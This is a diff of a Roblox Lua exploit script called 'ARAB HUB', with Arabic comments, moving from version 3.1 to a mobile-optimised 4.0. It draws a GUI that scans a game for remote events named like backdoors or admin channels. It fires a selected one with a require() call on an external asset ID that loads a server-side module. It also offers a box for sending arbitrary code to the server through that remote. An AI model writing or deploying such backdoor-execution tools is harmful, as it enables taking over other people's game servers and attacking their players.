@@ -1,102 +1,147 @@
--- [[ ARAB HUB v3.1 - FIXED VERSION ]] --
+-- [[ ARAB HUB v4.0 - MOBILE OPTIMIZED ]] --
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
--- كود لإظهار الواجهة فوراً
-local ScreenGui = Instance.new("ScreenGui")
+-- حذف الواجهة القديمة إذا كانت موجودة لتجنب التكرار
+if game.CoreGui:FindFirstChild("ArabHubGui") then
+    game.CoreGui.ArabHubGui:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
 ScreenGui.Name = "ArabHubGui"
-ScreenGui.Parent = game.CoreGui
 ScreenGui.ResetOnSpawn = false
 
+-- الواجهة الرئيسية (بالعرض)
 local MainFrame = Instance.new("Frame", ScreenGui)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
-MainFrame.Size = UDim2.new(0, 360, 0, 450)
-MainFrame.Position = UDim2.new(0.5, -180, 0.5, -225)
+MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.Size = UDim2.new(0, 500, 0, 300) -- مقاس عرضي مناسب للجوال
+MainFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
 MainFrame.Active = true
-MainFrame.Draggable = true -- مهم جداً للجوال
+MainFrame.Draggable = true
+Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
 
-local Title = Instance.new("TextLabel", MainFrame)
-Title.Size = UDim2.new(1, 0, 0, 50)
-Title.Text = "ARAB HUB - FIXED"
-Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+-- شريط العنوان
+local TitleBar = Instance.new("Frame", MainFrame)
+TitleBar.Size = UDim2.new(1, 0, 0, 40)
+TitleBar.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+Instance.new("UICorner", TitleBar)
+
+local Title = Instance.new("TextLabel", TitleBar)
+Title.Size = UDim2.new(1, -80, 1, 0)
+Title.Position = UDim2.new(0, 10, 0, 0)
+Title.Text = "ARAB HUB - V4 (MOBILE)"
+Title.TextColor3 = Color3.white
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 20
+Title.TextSize = 16
+Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.BackgroundTransparency = 1
 
--- صفحة البحث (Scanner)
-local ScannerPage = Instance.new("ScrollingFrame", MainFrame)
-ScannerPage.Size = UDim2.new(1, -20, 1, -120)
-ScannerPage.Position = UDim2.new(0, 10, 0, 60)
-ScannerPage.BackgroundTransparency = 1
-Instance.new("UIListLayout", ScannerPage).Padding = UDim.new(0, 5)
+-- زر الإغلاق
+local CloseBtn = Instance.new("TextButton", TitleBar)
+CloseBtn.Size = UDim2.new(0, 30, 0, 30)
+CloseBtn.Position = UDim2.new(1, -35, 0, 5)
+CloseBtn.Text = "X"
+CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+CloseBtn.TextColor3 = Color3.white
+Instance.new("UICorner", CloseBtn)
+CloseBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
 
--- واجهة الـ Require
-local HackPanel = Instance.new("Frame", MainFrame)
-HackPanel.Size = UDim2.new(1, 0, 1, 0)
-HackPanel.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
-HackPanel.Visible = false
+-- زر التصغير
+local MiniBtn = Instance.new("TextButton", TitleBar)
+MiniBtn.Size = UDim2.new(0, 30, 0, 30)
+MiniBtn.Position = UDim2.new(1, -70, 0, 5)
+MiniBtn.Text = "_"
+MiniBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+MiniBtn.TextColor3 = Color3.white
+Instance.new("UICorner", MiniBtn)
 
-local CodeBox = Instance.new("TextBox", HackPanel)
-CodeBox.Size = UDim2.new(1, -20, 0, 150)
-CodeBox.Position = UDim2.new(0, 10, 0, 60)
+-- محتوى الواجهة (تقسيم لليسار واليمين)
+local LeftSide = Instance.new("ScrollingFrame", MainFrame)
+LeftSide.Size = UDim2.new(0.45, 0, 0.7, 0)
+LeftSide.Position = UDim2.new(0, 10, 0, 50)
+LeftSide.BackgroundTransparency = 1
+LeftSide.ScrollBarThickness = 2
+local Layout = Instance.new("UIListLayout", LeftSide)
+Layout.Padding = UDim.new(0, 5)
+
+local RightSide = Instance.new("Frame", MainFrame)
+RightSide.Size = UDim2.new(0.45, 0, 0.7, 0)
+RightSide.Position = UDim2.new(0.52, 0, 0, 50)
+RightSide.BackgroundTransparency = 1
+
+-- صندوق الـ Require
+local CodeBox = Instance.new("TextBox", RightSide)
+CodeBox.Size = UDim2.new(1, 0, 0.75, 0)
 CodeBox.BackgroundColor3 = Color3.black
 CodeBox.TextColor3 = Color3.lime
+CodeBox.PlaceholderText = "Enter Require / Code..."
 CodeBox.MultiLine = true
-CodeBox.Text = ""
-CodeBox.PlaceholderText = "ضع الـ Require هنا..."
+CodeBox.TextSize = 12
+CodeBox.Font = Enum.Font.Code
+Instance.new("UICorner", CodeBox)
 
-local ExecBtn = Instance.new("TextButton", HackPanel)
-ExecBtn.Size = UDim2.new(1, -20, 0, 50)
-ExecBtn.Position = UDim2.new(0, 10, 0, 230)
-ExecBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
-ExecBtn.Text = "EXECUTE / تنفيذ"
+-- زر التنفيذ (Hacking)
+local ExecBtn = Instance.new("TextButton", RightSide)
+ExecBtn.Size = UDim2.new(1, 0, 0.2, 0)
+ExecBtn.Position = UDim2.new(0, 0, 0.8, 0)
+ExecBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+ExecBtn.Text = "HACKING (EXECUTE)"
 ExecBtn.TextColor3 = Color3.white
+Instance.new("UICorner", ExecBtn)
 
--- زر البحث (SCAN)
+-- زر الـ SCAN
 local ScanBtn = Instance.new("TextButton", MainFrame)
-ScanBtn.Size = UDim2.new(1, -20, 0, 50)
-ScanBtn.Position = UDim2.new(0, 10, 1, -60)
-ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
-ScanBtn.Text = "🔍 SCAN"
+ScanBtn.Size = UDim2.new(0.96, 0, 0, 35)
+ScanBtn.Position = UDim2.new(0, 10, 1, -45)
+ScanBtn.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
+ScanBtn.Text = "🔍 SCAN FOR BACKDOORS"
+ScanBtn.Font = Enum.Font.GothamBold
 ScanBtn.TextColor3 = Color3.white
+Instance.new("UICorner", ScanBtn)
 
--- === وظائف البحث والاختراق ===
+-- === المنطق البرمجي ===
 local selectedRemote = nil
+local function send(code)
+    if selectedRemote then
+        if selectedRemote:IsA("RemoteEvent") then selectedRemote:FireServer(code)
+        else selectedRemote:InvokeServer(code) end
+    end
+end
 
 ScanBtn.MouseButton1Click:Connect(function()
+    for _, v in pairs(LeftSide:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-            local b = Instance.new("TextButton", ScannerPage)
-            b.Size = UDim2.new(1, 0, 0, 40)
-            b.Text = "الثغرة: " .. v.Name
-            b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-            b.TextColor3 = Color3.white
-            b.MouseButton1Click:Connect(function()
-                selectedRemote = v
-                HackPanel.Visible = true
-                ScannerPage.Visible = false
-                ScanBtn.Visible = false
-                Title.Text = "TARGET: " .. v.Name
-            end)
+            local n = v.Name:lower()
+            if n:find("backdoor") or n:find("admin") or n:find("remote") or n:find("control") then
+                local b = Instance.new("TextButton", LeftSide)
+                b.Size = UDim2.new(1, 0, 0, 30)
+                b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+                b.Text = "Found: " .. v.Name
+                b.TextColor3 = Color3.yellow
+                b.TextSize = 10
+                Instance.new("UICorner", b)
+                b.MouseButton1Click:Connect(function()
+                    selectedRemote = v
+                    Title.Text = "Target Locked: " .. v.Name
+                    send("require(110047253067635):Hload('"..LocalPlayer.Name.."')")
+                end)
+            end
         end
     end
 end)
 
-ExecBtn.MouseButton1Click:Connect(function()
-    if selectedRemote and CodeBox.Text ~= "" then
-        if selectedRemote:IsA("RemoteEvent") then
-            selectedRemote:FireServer(CodeBox.Text)
-        else
-            selectedRemote:InvokeServer(CodeBox.Text)
-        end
+ExecBtn.MouseButton1Click:Connect(function() send(CodeBox.Text) end)
+
+-- ميزة التصغير
+local isMini = false
+MiniBtn.MouseButton1Click:Connect(function()
+    isMini = not isMini
+    if isMini then
+        MainFrame:TweenSize(UDim2.new(0, 500, 0, 40), "Out", "Quad", 0.3, true)
+        LeftSide.Visible, RightSide.Visible, ScanBtn.Visible = false, false, false
+    else
+        MainFrame:TweenSize(UDim2.new(0, 500, 0, 300), "Out", "Quad", 0.3, true)
+        LeftSide.Visible, RightSide.Visible, ScanBtn.Visible = true, true, true
     end
 end)
-
--- زر ARAB للفتح والإغلاق
-local Toggle = Instance.new("TextButton", ScreenGui)
-Toggle.Size = UDim2.new(0, 60, 0, 60)
-Toggle.Position = UDim2.new(0, 10, 0.4, 0)
-Toggle.BackgroundColor3 = Color3.red
-Toggle.Text = "ARAB"
-Toggle.MouseButton1Click:Connect(function() MainFrame.Visible = not MainFrame.Visible end)
-
